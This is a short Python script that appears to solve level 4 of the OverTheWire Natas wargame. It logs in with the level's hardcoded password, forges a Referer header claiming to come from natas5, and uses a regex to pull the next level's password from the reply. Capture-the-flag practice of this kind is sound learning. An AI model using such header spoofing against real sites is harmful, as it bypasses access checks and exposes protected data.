#!/usr/bin/env python3

import requests
import re

username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

url = 'http://%s.natas.labs.overthewire.org' % username

reqFrom = 'http://natas5.natas.labs.overthewire.org/'
headers = {
    'referer': reqFrom,
}

response = requests.get(url, auth=(username, password), headers=headers)
content = response.text

flag = re.findall('Access granted. The password for natas5 is (.*)', content)[0]

print(flag)